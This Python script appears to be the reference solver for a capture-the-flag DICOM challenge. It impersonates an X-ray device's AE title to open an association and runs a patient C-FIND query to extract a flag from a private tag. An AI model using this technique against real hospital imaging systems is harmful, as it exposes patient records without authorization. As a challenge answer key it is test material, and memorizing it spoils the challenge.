#!/usr/bin/env python3
"""Reference solver for Scare Floor DCM stage 2.

Associates with the X-ray using the AE titles recovered in stage 1, runs a
Patient-Root C-FIND for the named inmate, and extracts the BHV{...} flag from
the returned private tag (shown as VR UN / raw bytes when no private dictionary
is loaded).

Example:
    python solve_cfind.py --host 10.0.0.5 --port 11112 \
        --calling XRAY_ER_01 --called BHV_XR_9F2C71A4 --patient "SULLIVAN^JAMES"
"""
import argparse
import sys

from pydicom.dataset import Dataset
from pynetdicom import AE
from pynetdicom.sop_class import PatientRootQueryRetrieveInformationModelFind


def extract_flag(ds):
    """Return the first BHV{...} string found in any element value."""
    for elem in ds:
        val = elem.value
        if isinstance(val, bytes):
            try:
                val = val.decode("ascii")
            except UnicodeDecodeError:
                continue
        if isinstance(val, str) and "BHV{" in val:
            s = val.strip().strip("\x00").strip()
            start = s.index("BHV{")
            end = s.index("}", start) + 1
            return s[start:end]
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=11112)
    ap.add_argument("--calling", required=True, help="calling AE (leaked device)")
    ap.add_argument("--called", required=True, help="called AE = stage-1 flag")
    ap.add_argument("--patient", default="SULLIVAN^JAMES")
    args = ap.parse_args()

    ae = AE(ae_title=args.calling)
    ae.add_requested_context(PatientRootQueryRetrieveInformationModelFind)
    assoc = ae.associate(args.host, args.port, ae_title=args.called)
    if not assoc.is_established:
        print("[!] association failed — check your calling/called AE titles",
              file=sys.stderr)
        return 2

    query = Dataset()
    query.QueryRetrieveLevel = "PATIENT"
    query.PatientName = args.patient
    query.PatientID = ""

    flag = None
    for status, identifier in assoc.send_c_find(
        query, PatientRootQueryRetrieveInformationModelFind
    ):
        if status and status.Status in (0xFF00, 0xFF01) and identifier:
            found = extract_flag(identifier)
            if found:
                flag = found
    assoc.release()

    if flag:
        print(f"[flag] {flag}")
        return 0
    print("[!] no flag found in C-FIND responses", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
